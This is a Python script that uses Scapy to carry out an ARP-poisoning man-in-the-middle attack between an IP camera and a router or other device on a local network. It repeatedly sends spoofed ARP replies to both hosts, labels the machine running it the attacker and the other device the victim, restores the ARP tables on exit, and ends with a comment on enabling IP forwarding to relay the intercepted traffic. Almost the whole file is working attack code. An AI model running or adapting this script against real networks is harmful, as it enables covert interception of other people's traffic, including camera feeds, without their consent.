import time

from scapy.config import conf
conf.ipv6_enabled = False

from scapy.all import *
import logging

root = logging.getLogger()
root.setLevel(logging.INFO)

suspendTimeInSeconds = 30

"""
Function that retrieves the MAC address by IP of a device (retries in case the tries fail).
@param ip: string, IP Address we want to get the MAC from.
"""
def getmac(ip):
	#logging.info("Getting MAC Address for IP: {ip}.".format(ip))
	mac = None
	tries = 1
	while (mac == None and tries < 10):
		#logging.debug("MAC retrieval for IP: {ip}. Try: {try}.".format(ip, tries))
		mac = getmacbyip(ip)
		tries += 1
	if (mac == None):
		raise Exception("MAC Address could not be obtained for IP: {ip}".format(ip))
	return mac

"""
Function that sends a spoofed ARP packet to a target ip and mac address by a source ip.
@param: targetip: string, Target IP Address.
@param: targetmac: string, Targer MAC Address.
@param: sourceip: string, Source IP Address.
"""
def poisonarp(targetip, targetmac, sourceip):
	#logging.debug("Poisoning ARP with Target IP: {targetip}, Target MAC: {targetmac}, Source IP: {sourceip}".format(targetip, targetmac, sourceip))
	poisonPkt = ARP(op = 2 , pdst = targetip, psrc = sourceip, hwdst = targetmac)
	send(poisonPkt, verbose= False)

"""
Function that restored the ARP tables.
@param: targetip: string, Target IP Address.
@param: targetmac: string, Targer MAC Address.
@param: sourceip: string, Source IP Address.
@param: sourcemac: string, Source MAC Address
"""
def restorearp(targetip, targetmac, sourceip, sourcemac):
	#logging.debug("Restoring ARP with Target IP: {targetip}, Target MAC: {targetmac}, \ Source IP: {sourceip}, Source MAC: {sourcemac}".format(targetip, targetmac, sourceip, sourcemac))
	packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	#logging.info('ARP Table restored to normal for IP: {address}.'.format(address = targetip))

def execute(cameraip, deviceip):
	try:
		cameramac = getmac(cameraip)
	except Exception as e:
		logging.error(e)
		quit()

	logging.info('Camera IP Address: {address}.'.format(address = cameraip))
	logging.info('Camera MAC Address: {address}.'.format(address = cameramac))

	try:
		devicemac= getmac(deviceip)
	except Exception as e:
		logging.error(e)
		quit()

	logging.info('Router IP Address: {address}.'.format(address = deviceip))
	logging.info('Router MAC Address: {address}.'.format(address = devicemac))

	try:
		logging.info('Starting poisoning...')
		while True:
			# Add sleep timer for the poison act
			poisonarp(cameraip, cameramac, deviceip)
			poisonarp(deviceip, devicemac, cameraip)
			logging.info('Re-poisoning the targets in {suspendTimeInSeconds} seconds.'.format(suspendTimeInSeconds = suspendTimeInSeconds))
			time.sleep(suspendTimeInSeconds)
	except KeyboardInterrupt:
		logging.info('Stopping poisoning...')
		restorearp(deviceip, devicemac, cameraip, cameramac)
		restorearp(cameraip, cameramac, deviceip, devicemac)
		quit()

def main():

	# Debug purposes
	attackerip = conf.route.route("0.0.0.0")[1]
	attackermac = get_if_hwaddr(conf.iface)
	logging.info('Attacker IP Address: {address}.'.format(address = attackerip))
	logging.info('Attacker MAC Address: {address}.'.format(address = attackermac))

    # do not hardcode cameraip, because it might reset, ideally create script to prevent reset packets from the camera
	# possible defense mechanism there
	cameraip = "192.168.1.15"

	# Victim Computer. Might be the Gateway, might be another device.
	#targetip= conf.route.route("0.0.0.0")[2] # -> Gateway Router
	targetip = "192.168.1.9" # -> Example Device. This would need to be gathered from

	execute(cameraip, targetip)




if __name__=="__main__":
	main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward